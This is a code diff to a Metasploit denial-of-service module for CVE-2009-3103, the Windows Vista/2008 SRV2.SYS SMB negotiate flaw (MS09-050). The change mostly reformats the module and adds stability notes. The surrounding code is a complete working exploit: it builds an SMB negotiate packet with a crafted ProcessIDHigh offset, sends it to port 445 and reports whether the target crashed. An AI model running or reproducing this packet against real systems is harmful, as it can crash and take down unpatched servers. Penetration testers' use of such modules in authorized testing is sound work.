@@ -8,62 +8,67 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference',
-      'Description'    => %q{
-        This module exploits an out of bounds function table dereference in the SMB
-      request validation code of the SRV2.SYS driver included with Windows Vista, Windows 7
-      release candidates (not RTM), and Windows 2008 Server prior to R2.  Windows	Vista
-      without SP1 does not seem affected by this flaw.
-      },
+    super(
+      update_info(
+        info,
+        'Name' => 'Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference',
+        'Description' => %q{
+          This module exploits an out of bounds function table dereference in the SMB
+          request validation code of the SRV2.SYS driver included with Windows Vista, Windows 7
+          release candidates (not RTM), and Windows 2008 Server prior to R2.  Windows	Vista
+          without SP1 does not seem affected by this flaw.
+        },
 
-      'Author'         => [ 'Laurent Gaffie <laurent.gaffie[at]gmail.com>', 'hdm' ],
-      'License'        => MSF_LICENSE,
-      'References' =>
-        [
+        'Author' => [ 'Laurent Gaffie <laurent.gaffie[at]gmail.com>', 'hdm' ],
+        'License' => MSF_LICENSE,
+        'References' => [
           ['CVE', '2009-3103'],
           ['BID', '36299'],
           ['OSVDB', '57799'],
           ['MSB', 'MS09-050'],
           ['URL', 'https://seclists.org/fulldisclosure/2009/Sep/39']
-        ]
-    ))
+        ],
+        'Notes' => {
+          'Stability' => [CRASH_SERVICE_DOWN],
+          'SideEffects' => [],
+          'Reliability' => []
+        }
+      )
+    )
     register_options([
       Opt::RPORT(445),
       OptInt.new('OFFSET', [true, 'The function table offset to call', 0xffff])
     ])
-
   end
 
-
   def run
-    connect()
+    connect
 
     # The SMB 2 dialect must be there
     dialects = ['PC NETWORK PROGRAM 1.0', 'LANMAN1.0', 'Windows for Workgroups 3.1a', 'LM1.2X002', 'LANMAN2.1', 'NT LM 0.12', 'SMB 2.002']
-    data     = dialects.collect { |dialect| "\x02" + dialect + "\x00" }.join('')
+    data = dialects.collect { |dialect| "\x02" + dialect + "\x00" }.join('')
 
     pkt = Rex::Proto::SMB::Constants::SMB_NEG_PKT.make_struct
     pkt['Payload']['SMB'].v['Command'] = Rex::Proto::SMB::Constants::SMB_COM_NEGOTIATE
     pkt['Payload']['SMB'].v['Flags1'] = 0x18
     pkt['Payload']['SMB'].v['Flags2'] = 0xc853
-    pkt['Payload'].v['Payload']       = data
+    pkt['Payload'].v['Payload'] = data
 
     pkt['Payload']['SMB'].v['ProcessIDHigh'] = datastore['OFFSET'].to_i
-    pkt['Payload']['SMB'].v['ProcessID']     = 0
-    pkt['Payload']['SMB'].v['MultiplexID']   = rand(0x10000)
+    pkt['Payload']['SMB'].v['ProcessID'] = 0
+    pkt['Payload']['SMB'].v['MultiplexID'] = rand(0x10000)
 
-    print_status("Sending request and waiting for a reply...")
+    print_status('Sending request and waiting for a reply...')
     sock.put(pkt.to_s)
     r = sock.get_once
 
-    if(not r)
-      print_status("The target system has likely crashed")
+    if !r
+      print_status('The target system has likely crashed')
     else
       print_status("Response received: #{r.inspect}")
     end
 
-    disconnect()
+    disconnect
   end
 end
 
